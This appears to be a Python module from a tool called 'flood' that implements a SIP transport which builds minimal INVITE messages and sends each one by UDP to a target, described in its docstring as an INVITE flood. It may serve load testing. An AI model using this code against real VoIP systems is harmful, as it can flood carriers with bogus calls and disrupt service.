"""Experimental SIP transport. UDP INVITE flood, no media negotiation.

Not for production carriers. See SECURITY.md.
"""
from __future__ import annotations

import asyncio
import random

from flood.core.result import AttemptResult
from flood.core.transport import BaseTransport
from flood.handlers.call_handler import build_call_setup


class SipTransport(BaseTransport):
    kind = "sip"

    async def send(self, req, index: int) -> AttemptResult:
        loop = asyncio.get_running_loop()
        body = build_call_setup(req, index)
        target = req.target.raw.removeprefix("sip:")
        host, _, port = target.partition(":")
        port = int(port or 5060)
        invite = self._build_invite(body, index)

        transport, _ = await loop.create_datagram_endpoint(
            asyncio.DatagramProtocol,
            remote_addr=(host, port),
        )
        try:
            transport.sendto(invite.encode("utf-8"))
        finally:
            transport.close()
        return AttemptResult(index, "ok", detail="INVITE sent")

    def _build_invite(self, body: dict, index: int) -> str:
        branch = f"z9hG4bK-{random.randint(0, 0xFFFFFFFF):08x}"
        call_id = f"{body['tag']}@{self.session.id[:8]}"
        return (
            f"INVITE sip:{body['destination']} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP 0.0.0.0;branch={branch}\r\n"
            f"From: <sip:{body['caller_id']}>;tag={index}\r\n"
            f"To: <sip:{body['destination']}>\r\n"
            f"Call-ID: {call_id}\r\n"
            f"CSeq: 1 INVITE\r\n"
            f"Content-Length: 0\r\n\r\n"
        )